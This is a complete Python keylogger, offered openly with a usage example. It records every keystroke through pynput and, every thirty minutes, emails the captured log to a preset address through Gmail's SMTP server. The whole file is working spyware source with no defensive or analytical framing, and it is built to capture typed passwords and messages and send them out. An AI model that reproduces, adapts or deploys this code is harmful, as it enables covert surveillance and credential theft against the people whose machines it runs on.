import smtplib
import pynput.keyboard as keyboard
import threading

# Keylogger class
class Keylogger:
    def __init__(self, interval, email, password):
        self.log = ""
        self.interval = interval
        self.email = email
        self.password = password

    # Appends key to the log
    def append_to_log(self, string):
        self.log += string

    # Callback function to handle keypresses
    def on_press(self, key):
        try:
            self.append_to_log(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.append_to_log(" ")
            elif key == keyboard.Key.enter:
                self.append_to_log("\n")
            else:
                self.append_to_log(" [" + str(key) + "] ")

    # Sends email with the logged keypresses
    def send_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # Sends email at regular intervals
    def report(self):
        if self.log:
            self.send_email(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # Starts the keylogger
    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Usage example
if __name__ == "__main__":
    keylogger = Keylogger(interval=1800, email="enteryouremail@example.com", password="enteryourpassword")
    keylogger.start()
